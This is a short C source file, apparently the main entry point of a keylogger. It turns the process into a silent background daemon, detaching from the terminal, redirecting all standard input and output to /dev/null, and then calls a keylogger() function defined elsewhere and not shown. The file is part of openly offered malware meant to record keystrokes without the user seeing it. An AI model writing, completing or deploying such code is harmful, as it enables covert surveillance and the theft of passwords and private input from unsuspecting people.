#include "keylogger.h"

int main(void) {
		
	/* Our process ID and Session ID */
	pid_t pid, sid;
	
	dprintf(STDOUT_FILENO, "Configure daemon\n");
	/* Fork off the parent process */
	pid = fork();
	if (pid < 0) {
			exit(EXIT_FAILURE);
	}
	/* If we got a good PID, then
		we can exit the parent process. */
	if (pid > 0) {
			exit(EXIT_SUCCESS);
	}

	/* Change the file mode mask */
	umask(0);
			
	/* Open any logs here */        
			
	/* Create a new SID for the child process */
	sid = setsid();
	if (sid < 0) {
			/* Log the failure */
			exit(EXIT_FAILURE);
	}
	/* Change the current working directory */
	if ((chdir("/")) < 0) {
			/* Log the failure */
			exit(EXIT_FAILURE);
	}
	
	/* Close out the standard file descriptors */
	close(STDIN_FILENO);
	close(STDOUT_FILENO);
	close(STDERR_FILENO);
	if (open("/dev/null",O_RDONLY) == -1) {
		exit(EXIT_FAILURE);
	}
	if (open("/dev/null",O_WRONLY) == -1) {
		exit(EXIT_FAILURE);	
	}
	if (open("/dev/null",O_RDWR) == -1) {
		exit(EXIT_FAILURE);
	}
	/* Daemon-specific initialization goes here */
	keylogger();
	exit(EXIT_SUCCESS);
}
